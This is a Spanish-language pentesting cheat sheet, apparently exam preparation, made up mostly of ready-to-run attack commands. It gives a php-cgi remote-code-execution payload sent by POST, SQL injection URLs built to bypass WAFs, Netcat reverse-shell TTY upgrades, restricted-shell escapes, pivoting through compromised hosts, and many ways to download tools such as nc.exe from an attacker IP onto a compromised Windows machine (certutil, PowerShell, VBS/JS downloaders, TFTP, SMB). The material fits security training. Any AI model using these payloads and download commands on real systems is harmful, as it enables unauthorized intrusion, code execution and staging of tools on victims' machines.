A continuación, se detalla una vulnerabilidad presente en algunos **php-cgi** desactualizados, los cuales nos permiten entre otras cosas lograr la ejecución remota de comandos.

La pregunta a hacerse es, ¿cómo comprobamos si en caso de que exista, posee una versión vulnerable?. Dado que uno de los parámetros con los que cuenta el binario es el **-s**, el cual nos permite ver el Source de aquello que le pasemos, una de las trazas que suelo hacer para corroborar si es o no es vulnerable es hacer una consulta sobre el recurso **/?-s**.

Si lo que vemos es el código fuente en vez del contenido de la página en formato legible, esto quiere decir, en pocas palabras, que es probable que podamos hacer **RCE** (Remote Code Execution). Recapitulando, hemos sido capaces de ver el Source de la propia web a través del parámetro pasado, pero no sirve de mucho si lo que pretendemos hacer es dar un enfoque intrusivo a la máquina que sustenta este servidor web.

Sin embargo, existe otro parámetro interesante del php-cgi del cual nos podemos aprovechar, el parámetro **-d**. Este parámetro nos permite definir las entradas **INI** de la configuración de archivos. Algo a tener en cuenta, en caso de pretender lograr ejecución remota de código, es tratar de enviar código PHP al servidor y que sea capaz de interpretarlo. 

Para ello, lo que hacemos es utilizar el _wrapper_ **php://input**, con el fin de incrustar el código definido en el cuerpo de la solicitud.

Necesitamos 2 cosas para ello, por un lado, necesitamos que se lea el código php de nuestra solicitud. Lo que buscamos es una opción PHP que diga al propio PHP que lea de un archivo y lo apunte a **php://input**. Afortunadamente, PHP cuenta con la opción **auto_prepend_file** desde la versión 4.2.3. Lo bueno de esta opción, es que el contenido del archivo se incluye antes que cualquier otro archivo, o en otras palabras, se incluye antes de ejecutar cualquier otro código, por lo que garantizamos que ningún otro código afecte a nuestra explotación.

Por otro lado, si queremos usar **php://input**, debemos permitir que la url lo incluya, pero esto no supone ningún problema, dado que podemos redefinir las entradas INI. Esto puede activarse fácilmente usando **-d allow_url_include=1**.

Suponiendo que quisiéramos ejecutar en remoto el comando _whoami_, lo que hacemos es montarnos un simple script PHP de antemano el cual enviamos posteriormente vía POST a la web con todo lo que hemos comentado. De la siguiente forma:

```bash
$~ echo &quot;&lt;?php system('whoami');die(); ?&gt;&quot; | POST &quot;http://192.168.1.X/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&quot;

www-data
```

Para entablar una reverse shell, ya simplemente dependerá de la metodología que una quiera emplear.

#### Waf Bypassing

##### WAF SQL Injection Bypass WAF Techniques

**1. Null Bytes**

Para elaborar una inyección **Null Byte**:

```bash
http://example.com/news.php?id=1+%00’union+select+1,2,3′–
```

**2. Consultas a través de SQL Comments**

```bash
http://example.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3–
```

**3. URL Encoding**

```bash
http://example.com/news.php?id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4—
```

**4. Encode to Hex Forbidden**

```bash
http://example.com/news.php?id=-1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 –+-

http://example.com/news.php?id=-1%2F%2Funion%2F%2Fselect%2F**%2F1,2,3,4,5 –+-
```

**5. Case Changing**

```bash
http://example.com/news.php?id=-1+UnIoN//SeLecT//1,2,3–+-
```

**6. Replaced Keywords**

```bash
http://example.com/news.php?id=-1+UNunionION+SEselectLECT+1,2,3–+
```

**7. WAF Bypassing - using characters**

```bash
http://example.com/news.php?id=-1+uni*on+sel*ect+1,2,3,4–+-
```

**8. CRLF WAF Bypass Technique**

```bash
http://example.com/news.php?id=-1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5 —
```

**9. HTTP Parameter Pollution (PHP)**

```bash
http://example.com/news.php?id=1;select+1&amp;id=2,3+from+users+where+id=1–


http://example.com/news.php?id=-1/* &amp;id= */union/* &amp;id= */select/* &amp;id= */1,2 —
```


### Pentesting Linux

#### Tratamiento de la TTY

Una vez accedemos a un equipo Linux con una reverse shell de Netcat, veremos que andamos a ciegas, lo que hace que incluso no podamos utilizar servicios que corran en interactivo (Python, mysql, etc.). Para arreglar este problema, simplemente seguimos los pasos que se describen a continuación.

* Cargamos una pseudoconsola sobre el sistema

Tenemos 2 formas de hacer esto, la primera es la siguiente:

```bash
script /dev/null -c bash
```

Otra de ellas es a través de python, para ello se recomienda aplicar un `whereis python` a nivel de sistema para comprobar las versiones que se encuentran presentes en el sistema, así tendremos que aplicar el siguiente comando seguido de su versión:

```bash
python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
```

* Configuramos las variables de entorno correctamente

A continuación presionamos la tecla **Ctrl+Z**, esto lo que hará será dejar en segundo plano nuestra sesión (no hay que asustarse). Una vez hecho, aplicamos los siguientes comandos:

```bash
stty raw -echo
fg
reset
xterm
```

Tras introducir el primero, es normal que al escribir **fg** no veamos lo que se está escribiendo, sin embargo se están introduciendo los caracteres. Este comando lo que hará será retornanos a la sesión que teníamos vía **Netcat**. Con el comando **reset** reconfiguraremos nuestra sesión, preguntándonos en la mayoría de los casos a continuación con qué tipo de terminal queremos tratar.

Puede ser que no nos pregunte por el tipo de terminal, en caso de que sí lo haga, introducimos `xterm`, en caso de que no e incluso aunque lo pida, posteriormente aplicamos los siguientes comandos:

```bash
export TERM=xterm
export SHELL=bash
```

Una vez hecho, lo único que queda (paso opcional), es configurar correctamente el redimensionamiento de la terminal, pues en caso de abrir algún editor como nano, veremos que las proporciones no cuadran. Para ello, lo más recomendable es poner a tamaño completo la terminal.

Abrimos otra terminal en nuestro sistema con el mismo redimensionamiento, y aplicamos el siguiente comando:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #stty -a
speed 38400 baud; rows 44; columns 190; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;
min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

```

Tal y como podemos ver, figuran los números de filas y columnas, 44 y 190 respectivamente para este caso. Copiamos dicha configuración en la máquina que hemos comprometido donde se ha llevado a cabo toda la previa configuración, aplicando para ello el siguiente comandos:

```bash
stty rows 44 columns 190
```

El resultado final será una Shell completamente interactiva, donde nos sentiremos como si hubiéramos ganado acceso por SSH, con capacidad de tabulación, uso de Shortcuts (Ctrl+C, Ctrl+L, etc.), sesiones interactivas, etc.


#### Process Monitoring

A la hora de escalar privilegios, es una buena idea montarse un script **procmon.sh** para la monitorización de procesos y comandos aplicados a nivel de sistema en tiempo real.

Para ello, tan sólo tendremos que crear un script sobre el sistema como el siguiente:

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff &lt;(echo &quot;$old_process&quot;) &lt;(echo &quot;$new_process&quot;) | grep &quot;[\&gt;\&lt;]&quot; | grep -v &quot;procmon.sh&quot; | grep -v &quot;command&quot;
	old_process=$new_process
done
```

Tras su ejecución, tendremos una visual de toods los comandos que se están aplicando a nivel de sistema, incluidos los llevados a cabo por el usuario root del equipo, incluyendo rutas y subprocesos.

#### Escaping Restricted Shell

Con el objetivo de preparar un escenario realista, presentaré 2 casos, partiendo de una escapada convencional a otra un poco más rebuscada. También hay que decir que todo dependerá del nivel de restricción que el administrador haya implementado sobre el usuario.

Para el primer caso, seguimos los siguientes pasos para preparar nuestro escenario de usuario:

```bash
┌─[root@parrot]─[/home]
└──╼ #mkdir testuser
┌─[root@parrot]─[/home]
└──╼ #useradd testuser -d /home/testuser -s /bin/rbash
┌─[root@parrot]─[/home]
└──╼ #passwd testuser
Introduzca la nueva contraseña de UNIX: 
Vuelva a escribir la nueva contraseña de UNIX: 
passwd: contraseña actualizada correctamente
┌─[root@parrot]─[/home]
└──╼ #chown testuser:testuser /home/testuser
```

En este caso, la contraseña asignada ha sido **test123**. Como vemos, se ha asignado una shell restrictiva al usuario **testuser**, esto lo podemos comprobar a través de la variable **export**:

```bash
testuser@parrot:~$ export
declare -x DBUS_SESSION_BUS_ADDRESS=&quot;unix:path=/run/user/1002/bus&quot;
declare -x HOME=&quot;/home/testuser&quot;
declare -x LANG=&quot;es_ES.UTF-8&quot;
declare -x LOGNAME=&quot;testuser&quot;
declare -x MAIL=&quot;/var/mail/testuser&quot;
declare -x OLDPWD
declare -rx PATH=&quot;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/snap/bin&quot;
declare -x PWD=&quot;/home/testuser&quot;
declare -rx SHELL=&quot;/bin/rbash&quot;
declare -x SHLVL=&quot;1&quot;
declare -x SSH_CLIENT=&quot;::1 48084 22&quot;
declare -x SSH_CONNECTION=&quot;::1 48084 ::1 22&quot;
declare -x SSH_TTY=&quot;/dev/pts/1&quot;
declare -x TERM=&quot;xterm&quot;
declare -x USER=&quot;testuser&quot;
declare -x XDG_DATA_DIRS=&quot;/usr/local/share:/usr/share:/var/lib/snapd/desktop&quot;
declare -x XDG_RUNTIME_DIR=&quot;/run/user/1002&quot;
declare -x XDG_SESSION_ID=&quot;80&quot;
testuser@parrot:~$ 
```

Tal y como vemos en la variable **SHELL**, tenemos la _restricted bash_. Si un administrador de sistemas asigna esta shell a un usuario, en un principio se toparía con estos inconvenientes:

```bash
testuser@parrot:~$ pwd
/home/testuser
testuser@parrot:~$ cd
-rbash: cd: restringido
testuser@parrot:~$ cd ..
-rbash: cd: restringido
testuser@parrot:~$ cd /
-rbash: cd: restringido
testuser@parrot:~$ echo prueba &gt; fichero.txt
-rbash: fichero.txt: restringido: no se puede redirigir la salida
testuser@parrot:~$ touch fichero
testuser@parrot:~$ mkdir directorio
testuser@parrot:~$ ls -l
total 4
drwxr-xr-x 2 testuser testuser 4096 nov 11 23:52 directorio
-rw-r--r-- 1 testuser testuser    0 nov 11 23:52 fichero
```

Existen ciertos inconvenientes en cuanto a movilidad respecta, aunque sí que es cierto que en cuanto a visualización, podemos visualizar cualquier recurso del sistema sin mayor inconveniente. Un administrador de sistemas poco experimentado, podría no tener en cuenta lo siguiente:

```bash
testuser@parrot:~$ echo $SHELL
/bin/rbash
testuser@parrot:~$ cd ..
-rbash: cd: restringido
testuser@parrot:~$ bash
testuser@parrot:~$ pwd
/home/testuser
testuser@parrot:~$ cd ..
testuser@parrot:/home$ ls
s4vitar  testuser
testuser@parrot:/home$ cd /
testuser@parrot:/$ pwd
/
testuser@parrot:/$ 
```

Con la misma, el usuario se ha escapado a una **bash**, teniendo mayor movilidad sobre el sistema. Es por ello que como buena medida, además de asignar dicha Shell se haga algo como esto:

```bash
┌─[root@parrot]─[/home/testuser]
└──╼ #pwd
/home/testuser
┌─[root@parrot]─[/home/testuser]
└──╼ #mkdir bin
┌─[root@parrot]─[/home/testuser]
└──╼ #cd !$
cd bin
┌─[root@parrot]─[/home/testuser/bin]
└──╼ #cp /bin/ping .
┌─[root@parrot]─[/home/testuser/bin]
└──╼ #cp /usr/bin/tee .
┌─[root@parrot]─[/home/testuser/bin]
└──╼ #cp /bin/ls .
┌─[root@parrot]─[/home/testuser/bin]
└──╼ #ls
ls  ping  tee
┌─[root@parrot]─[/home/testuser/bin]
└──╼ #chmod o+w ping
┌─[root@parrot]─[/home/testuser/bin]
└──╼ #cd ..
┌─[root@parrot]─[/home/testuser]
└──╼ #echo -e &quot;PATH=/home/testuser/bin\nexport PATH&quot; &gt; .bashrc
┌─[root@parrot]─[/home/testuser]
└──╼ #cat .bashrc
PATH=/home/testuser/bin
export PATH
```

Como vemos en este caso el administrador de sistemas ha decidido que sólo pueda ejecutar esos 3 comandos (**ls ping tee**). 

Este caso es a modo de ejemplo, y la asignación de permisos de escritura por parte de otros al binario **ping** se ha hecho a posta para que se vea cómo por esta simple tontería un usuario podría escapar de la restricted bash.

Veamos cómo sería la movilidad a nivel de usuario:

```bash
testuser@parrot:~$ echo $PATH
/home/testuser/bin
testuser@parrot:~$ ls
bin
testuser@parrot:~$ cat .bashrc
rbash: cat: no se encontró la orden
testuser@parrot:~$ cat /etc/passwd
rbash: cat: no se encontró la orden
testuser@parrot:~$ cd ..
rbash: cd: restringido
testuser@parrot:~$ cd /
rbash: cd: restringido
testuser@parrot:~$ touch archivo
rbash: touch: no se encontró la orden
testuser@parrot:~$ mkdir directorio
rbash: mkdir: no se encontró la orden
testuser@parrot:~$ ls bin
ls  ping  tee
testuser@parrot:~$ ping -c 1 localhost
ping: socket: Operación no permitida
testuser@parrot:~$ ping localhost
ping: socket: Operación no permitida
testuser@parrot:~$ 
```

El usuario está mucho más limitado, pues sus binarios se encuentran bajo el directorio /bin de su home y sólo puede ejecutar 3 comandos muy básicos. Como vemos, el usuario **testuser** no puede visualizar el recurso **.bashrc**, donde está definido su PATH. Esto es así debido a que no puede ejecutar el comando **cat**.

Sin embargo, aprovechando el permiso que el administrador del sistema asignó al binario **ping**, el usuario puede hacer lo siguiente para visualizar el recurso a modo de ejemplo:

```bash
testuser@parrot:~$ ls -l bin
total 240
-rwxr-xr-x 1 root root 138856 nov 11 23:59 ls
-rwxr-xrwx 1 root root  65272 nov 11 23:56 ping
-rwxr-xr-x 1 root root  39648 nov 11 23:57 tee
testuser@parrot:~$ echo '#!/bin/bash' | tee bin/ping
#!/bin/bash
testuser@parrot:~$ echo '/bin/cat /home/testuser/.bashrc' | tee -a bin/ping
/bin/cat /home/testuser/.bashrc
testuser@parrot:~$ ping
PATH=/home/testuser/bin
export PATH
testuser@parrot:~$ 
```

Dado que algo típico en el **rbash** es el no poder utilizar los operadores **&gt; / &gt;&gt;** para redirigir la salida de comandos, el usuario se puede aprovechar de la utilidad de **rbash** para depositar contenido sobre su directorio personal, así como sobre el recurso **ping** situado en el directorio **bin/**. 

De esta forma, dado que la variable **PATH** figura sobre dicho directorio, puede hacer que el binario **ping** tome una nueva funcionalidad, donde como vemos, se aprovecha de la misma para visualizar el recurso **.bashrc**. Una vez ve que el problema radica en dicho recurso, puede aplicar el siguiente movimiento lateral:

```bash
testuser@parrot:~$ echo '#!/bin/bash' | tee bin/ping
#!/bin/bash
testuser@parrot:~$ echo '/bin/rm /home/testuser/.bashrc' | tee -a bin/ping
/bin/rm /home/testuser/.bashrc
testuser@parrot:~$ ls -a
.  ..  .bash_history  .bashrc  bin  .gnupg
testuser@parrot:~$ ping
/bin/rm: ¿borrar el fichero regular '/home/testuser/.bashrc'  protegido contra escritura? (s/n) s
testuser@parrot:~$ ls -a
.  ..  .bash_history  bin  .gnupg
testuser@parrot:~$ 
```

Una vez logra borrar el **.bashrc**, el siguiente objetivo es configurar una nueva variable de entorno **SHELL**, con la shell deseada, de la siguiente forma:

```bash
testuser@parrot:~$ echo 'export SHELL=bash' | tee '/home/testuser/.bashrc'
export SHELL=bash
testuser@parrot:~$ echo $SHELL
/bin/rbash
testuser@parrot:~$ exit
exit
┌─[root@parrot]─[/home/testuser]
└──╼ #su testuser
testuser@parrot:~$ echo $SHELL
bash
testuser@parrot:~$ cd ..
rbash: cd: restringido
testuser@parrot:~$ cd /
rbash: cd: restringido
testuser@parrot:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin
```

Ahora mismo, el usuario posee una bash tal y como figura en su variable de entorno **SHELL**, sin embargo, por alguna razón... sigue estando con las mismas restricciones. Llegados a este punto, lo único que debe hacer es el típico **shell spawning** aprovechando la utilidad de algún otro binario, dado que su **PATH** ahora cuenta con todas las rutas absolutas de los binarios del sistema.

Para el siguiente caso, lo hacemos aprovechando la utilidad **-exec** del comando **find**:

```bash
testuser@parrot:~$ cd ..
rbash: cd: restringido
testuser@parrot:~$ find /etc/passwd -exec /bin/bash \;
testuser@parrot:~$ pwd
/home/testuser
testuser@parrot:~$ cd ..
testuser@parrot:/home$ ls
s4vitar  testuser
testuser@parrot:/home$ export
declare -x COLORTERM=&quot;truecolor&quot;
declare -x DISPLAY=&quot;:0.0&quot;
declare -x HOME=&quot;/home/testuser&quot;
declare -x LANG=&quot;es_ES.UTF-8&quot;
declare -x LOGNAME=&quot;testuser&quot;
declare -x LS_COLORS=&quot;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&quot;
declare -x MAIL=&quot;/var/mail/testuser&quot;
declare -x OLDPWD=&quot;/home/testuser&quot;
declare -x PATH=&quot;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin&quot;
declare -x PWD=&quot;/home&quot;
declare -x SHELL=&quot;bash&quot;
declare -x SHLVL=&quot;3&quot;
declare -x SUDO_COMMAND=&quot;/bin/su&quot;
declare -x SUDO_GID=&quot;1000&quot;
declare -x SUDO_UID=&quot;1000&quot;
declare -x SUDO_USER=&quot;s4vitar&quot;
declare -x TERM=&quot;xterm&quot;
declare -x USER=&quot;testuser&quot;
declare -x USERNAME=&quot;root&quot;
declare -x XAUTHORITY=&quot;/home/s4vitar/.Xauthority&quot;
testuser@parrot:/home$ 
```

#### Pivoting con Shuttle

Aunque en el examen no caerán temas de Pivoting, nunca viene mal tener este concepto claro para saltar a otras redes (de cara a la máquinas del laboratorio para saltar a los distintos segmentos).

Yo en verdad no suelo ser muy partidario de esta herramienta, lo que suelo hacer en su defecto es aplicar un '_Dynamic Port Forwarding_', de este modo sobre el sistema:

```bash
ssh -D 1080 usuario@host
```

Y diréis, ah... pero hay que conocer la password. Obviamente... si comprometes un equipo, será a fondo, lo mismo sucederá con **Shuttle**.

Una vez hecha la conexión, tendremos que aplicar la siguiente configuración desde el fichero '_/etc/proxychains.conf_':

```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to &quot;tor&quot;
socks4  127.0.0.1 1080
```

De esta forma, conseguimos que a la hora de aplicar la siguiente sintaxis sobre un Host al que no deberíamos tener conectividad:

```bash
$~ proxychains ssh root@ipOtroSegmento
```

Tengamos alcance y nos resuelva el servicio. Para los escaneos con **nmap** sucede lo mismo, solo que hay que añadir una ligera variación en cuanto a parámetros respecta:

```bash
$~ proxychains nmap -p21,80,443 -r -v --open -T5 -v -Pn -T5 -n -oG openPorts
```

Tendremos que añadir los parámetros '-T5 -Pn' generalmente, lo mismo para escanear a fondo dichos puertos:

```bash
$~ proxychains nmap -p21,80,443 -Pn -T5 -sC -sV
```

Dicho esto, explico el uso de **Shuttle**. Supongamos que acabamos de comprometer el sistema **192.168.1.X**, tenemos las credenciales del usuario **pepe** para conexión por SSH y descubrimos que desde dicho sistema tenemos conectividad con un nuevo segmento **10.2.15.0/24**. Una vez teniendo **shuttle** en nuestro sistema, lo único que tendremos que hacer es lo siguiente:

```bash
sshuttle -vr pepe@192.168.1.X:22000 10.2.15.1/24 -x 192.168.1.X
```

Donde el parámetro '_-x_' es opcional, por el cual especificamos la propia IP del sistema para descartarla posteriormente del rango de conectividad. (Una tontería, pero bueno)

# Port Knocking

Que no falte mencionar esta famosa practica para ocultar puertos. Para que sea entendible la utilidad sin entrar mucho a nivel técnico, digamos que tenemos un VPS por el cual accedemos normalmente por el puerto 22 hacia el servicio SSH. ¿Qué sucede?, que el servicio queda público de cara hacia fuera. Una práctica para proteger estos servicios es configurar una serie de puertos (generalmente 3), para de golpearlos hacer visible temporalmente estos servicios.

Me explico, supongamos que tras un escaneo inicial, vemos que el puerto 22 para el servicio SSH figura como '_closed_'. Sin embargo, por X razones, sabemos que de aplicar un **Port Knocking** sobre los puertos 4264 4563 5798, el puerto 22 se abre temporalmente permitiendo conexiones entrantes al servicio.

**¿Cómo hacemos para golpear dichos puertos y realizar la conexión?**

Los hay quienes se montan un script infumable, realmente no hace falta:

```bash
$~ nmap -p4264,4563,5798 -r -T5 -PN &amp;&amp; ssh usuario@ip
```

Con hacer esto, se habilitaría temporalmente el servicio SSH sobre el puerto 22, visualizando la conexión asociada así como la autenticación para validar el usuario.

Como **nmap** a veces es muy suyo y no sigue el orden fijado de puertos a escanear, asignamos el parámetro '_-n_' para que el **Port Knocking** haga efecto, pues en caso de golpearlos en el orden incorrecto simplemente no sucederá nada.

### Pentesting Windows

A pesar de implementar y poner en práctica otras técnicas que no describo en los siguiente puntos, enumero a continuación las que para mi son más importantes y las que considero que uno debe de tener bien claras para el correcto manejo sobre los equipos Windows como atacante, así como de cara al examen.

#### Transferencia de Archivos

Tenemos distintas formas de transferir archivos desde la máquina Windows que hayamos comprometido. Para la primera de ellas, nos aprovechamos de **certutil**, compartiendo para ello un servidor en Python sobre nuestro equipo en los recursos que queramos compartir y aplicando el siguiente comando desde la máquina Windows:

`certutil.exe -f -urlcache -split http://nuestraIP:puerto/recurso.exe output.exe`

En caso de no contar con **certutil**, podemos montarnos un servicio FTP en local, para posteriormente desde la máquina Windows vía **FTP** obtener los recursos. Para ello, tendremos que crear un archivo _.txt_ sobre la máquina Windows con el siguiente contenido (IP local 192.168.1.45 a modo de ejemplo):

```bash
open 192.168.1.45 21
user s4vitar
password
binary
GET archivo
bye
```

Para ello, simplemente desde el _CMD_ vamos haciendo lo siguiente:

```bash
echo open 192.168.1.45 21 &gt; ftp.txt
echo user s4vitar &gt;&gt; ftp.txt
echo password &gt;&gt; ftp.txt
echo binary &gt;&gt; ftp.txt
echo GET archivo &gt;&gt; ftp.txt
echo bye &gt;&gt; ftp.txt
```

Para que se realicen los pasos fijados sobre el fichero, es necesario desde la máquina Windows aplicar el siguiente comando:

```bash
ftp -v -n -s:ftp.txt
```

Una vez hecho, se realizará la transferencia y tendremos el recurso en la máquina Windows. Lo mismo habría valido para enviar archivos a nuestra máquina local.

En caso de evitar tener que realizar configuraciones a nivel de archivos para compartir el servidor FTP, podemos aplicar el siguiente comando desde la máquina Linux:

```bash
python -m pyftpdlib -p 21 -w
```

Posteriormente, ejecutamos las mismas instrucciones del lado de la máquina comprometida.

Otra vía para realizar la transferencia de archivos desde nuestra máquina de atacante a la máquina Windows comprometida es aprovecharse de la utilidad **TFTP**. Para ello, desde nuestra máquina de atacante, aplicamos el siguiente comando especificando el directorio cuyos recursos queremos compartir:

```bash
atftpd --daemon --port 69 /tftp
```

Una vez hecho, desde la máquina Windows, aplicamos el siguiente comando:

```bash
tftp -i 192.168.1.45 GET nc.exe
```

Otra vía para realizar transferencia de archivos es desde nuestra máquina de atacante, compartir los recursos a través de un servidor web vía Python:

```bash
python -m SimpleHTTPServer 443
```

Y desde la máquina Windows, aplicar los siguientes comandos de **Powershell**:

```powershell
powershell -c &quot;(new-object  System.Net.WebClient).DownloadFile('http://192.168.1.45:443/file.exe','C:\Users\user\Desktop\file.exe')&quot;

# También podemos usar esta otra forma
powershell Invoke-WebRequest &quot;http://192.168.1.45:443/file.exe&quot; -OutFile &quot;C:\Users\user\Desktop\file.exe&quot;
```

Por si todas estas vías de transferencia de archivos se nos quedan cortas, podemos hacerlo a través de un script en **VBS**, que suele funcionar para la mayoría de las veces. Para ello, desde la máquina Windows, tendremos que aplicar las siguientes instrucciones:

```bash
echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
echo Err.Clear &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs
echo http.Send &gt;&gt; wget.vbs
echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
echo strData = &quot;&quot; &gt;&gt; wget.vbs
echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
echo Next &gt;&gt; wget.vbs
echo ts.Close &gt;&gt; wget.vbs
```

Una vez definido el recurso **wget.vbs**, aplicamos el siguiente comando para una vez montando nuestro servidor web vía Python en la máquina atacante, descargar los recursos que consideremos:

```bash
cscript wget.vbs http://192.168.1.45:443/file.exe file.exe
```

Por si vemos que es mucha molestia estar definiendo todo el script _wget.vbs_, podemos acotarlo de la siguiente forma, y funcionará igualmente:

```bash
echo var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;); &gt; wget.vbs
echo WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false); &gt;&gt; wget.vbs
echo WinHttpReq.Send(); &gt;&gt; wget.vbs
echo WScript.Echo(WinHttpReq.ResponseText); &gt;&gt; wget.vbs
echo BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;); &gt;&gt; wget.vbs
echo BinStream.Type = 1; &gt;&gt; wget.vbs
echo BinStream.Open(); &gt;&gt; wget.vbs
echo BinStream.Write(WinHttpReq.ResponseBody); &gt;&gt; wget.vbs
echo BinStream.SaveToFile(&quot;out.bin&quot;); &gt;&gt; wget.vbs
```

Una vez hecho, desde la propia máquina comprometida aplicamos el siguiente comando para descargar los recursos que estemos compartiendo en local:

```bash
cscript /nologo wget.js http://192.168.1.45:443/recurso.exe
```

En caso de haber ganado acceso al equipo Windows con **nishang** aprovechando la utilidad _Invoke-PowerShellTcp.ps1_ (aunque también sirve para consola normal, sólo que me gusta trabajar en este aspecto directamente desde la Powershell), algo que podemos hacer es realizar la transferencia por samba aprovechando **smbserver** de **Impacket**.

Para ello, desde nuestro equipo de atacante, aplicamos el siguiente comando bajo un directorio previo que hayamos creado específico para la compartición de archivos:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/smb]
└──╼ #impacket-smbserver shared `pwd`
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

A continuación, desde la máquina Windows desde la sesión Powershell, aplicamos el siguiente comando:

```bash
New-PSDrive -Name &quot;SharedFolder&quot; -PSProvider &quot;FileSystem&quot; -Root &quot;\\192.168.1.45\shared&quot;
```

